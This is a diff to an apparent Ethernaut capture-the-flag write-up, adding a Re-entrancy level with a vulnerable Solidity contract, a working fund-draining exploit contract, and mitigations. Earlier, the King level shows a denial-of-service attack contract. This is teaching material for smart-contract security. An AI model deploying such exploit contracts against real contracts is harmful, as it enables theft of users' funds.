@@ -8,7 +8,7 @@
 7. [Force](#7-force)
 8. [Vault](#8-vault)
 9. [King](#9-king)
-10. [Re-entrancy]
+10. [Re-entrancy](#10-re-entrancy)
 11. [Elevator]
 12. [Privacy]
 13. [Gatekeeper One]
@@ -504,7 +504,7 @@ contract King {
 ```
 ### Solution
 ##### Explanation
-It is possible that the calling address can be a contract. `King` function does use any patter to avoid it from being victim of DOS attack. If we create a contract with ether equivalent of `prize` and send the same to `King`, it will become new king. Then all we need is a payable fallback function that reverts whenever triggered since `King` will transfer the amount to this contract whenever someone tries to become new king.
+Calling address can be a contract. The `King` contract does not use any pattern to avoid it from being a victim of a DOS attack. If we create a contract with ether equivalent of `prize` and send the same to `King`, it will become a new king. Then all we need is a payable fallback function that reverts whenever triggered since `King` will transfer the amount to this contract whenever someone tries to become a new king.
 ##### Exploit
 ```
 contract Attack_King {
@@ -525,8 +525,88 @@ contract Attack_King {
   }
 }
 ```
-1. Deploy above contract with `king` contract address as constructor argument.\
-And we are done. It can no longer change the king despite the value of ether sent.
+1. Deploy the above contract with the `king` contract address as the constructor argument.\
+And we are done. It can no longer change the king despite the value of the ether sent.
 ##### Takeaway from Ethernaut
-Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.\
-In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
+Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that happened — a real hack or a real bug.\
+In this case, see [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
+
+# 10. Re-entrancy
+### Challenge
+- The goal of this level is to steal all the funds from the contract.
+### Purpose
+Understanding Re-entrancy attack.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+```
+### Solution
+##### Explanation
+`withdraw()` in the `Reentrance` contract uses `call` to send the amount. And it changes the balance after sending the amount. If the withdrawer is a contract, it can re-enter by calling withdraw function from its fallback or receive function since the balance is yet to be updated.
+##### Exploit
+```
+contract AttackReentrance {
+  Reentrance public target;
+
+  constructor(Reentrance _target) public {
+    target = _target;
+  }
+
+  receive() external payable {
+    if(targetBalance() > 0) {
+      target.withdraw(targetBalance());
+    }
+  }
+
+  function attack() external payable {
+    target.donate{value: targetBalance()}(address(this));
+    target.withdraw(targetBalance());
+    (bool success,) = msg.sender.call{value: address(this).balance}("");
+    require(success, "transfer failed");
+  }
+
+  function targetBalance() public view returns(uint256) {
+    return address(target).balance;
+  }
+}
+```
+1. Deploy the above contract with the `Reentrance` instance as an argument.
+2. Call `attack()` to donate and trigger re-entrance. (I used to donate the same balance in the Reentrance contract to pass the check condition while attacking)\
+Hurray! We now know how classic re-entrance works. Read the below mitigations to avoid this.
+##### Takeaway from Ethernaut
+To prevent re-entrance attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.\
+`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).\
+Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.\
+\
+Re-entrancy is a common attack. You should always be prepared for it!\
+\
+The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
